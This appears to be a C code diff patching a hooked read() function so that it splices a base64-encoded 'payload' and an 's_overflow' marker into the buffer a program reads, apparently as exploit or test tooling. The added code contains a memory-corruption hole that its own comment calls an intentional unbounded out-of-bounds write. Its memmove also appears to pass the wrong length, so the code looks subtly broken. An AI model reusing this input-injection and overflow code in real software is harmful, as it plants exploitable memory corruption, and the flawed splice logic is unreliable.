@@ -427,15 +427,27 @@ ssize_t read(int fd, void *buf, size_t count) {
 			} // if
 
 dumpload(&payload);
+			// Generate the payload that we will "echo" back
                         unsigned char sPayload64[4096];
                         size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
+
+			// Make room for the payload (where the request used to be).
                         char *src = p + nc;
-                        char *dst = p - strlen(s_magic) - strlen(s_makeload) + nPayload64;
-                        int need = strlen(s_magic) - strlen(s_makeload) - nc + nPayload64;
-                        int tail = result - (src - ((char *) buf));
-                        memmove(dst, src, tail);
-                        memcpy(((char *) p) - strlen(s_magic) - strlen(s_makeload), sPayload64, nPayload64);
-                        result += need;
+                        char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
+			int delta = dst - src;
+                        memmove(dst, src, delta);
+
+			// Replace s_makeload with s_overflow
+			memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
+			p += strlen(s_overflow) - strlen(s_makeload);
+
+			// Place the payload in the newly created space
+                        memcpy(p, sPayload64, nPayload64);
+
+			// Adjust the number of characters read
+                        result += delta;
+
+			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
                         ((char *) buf)[result] = 0;
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
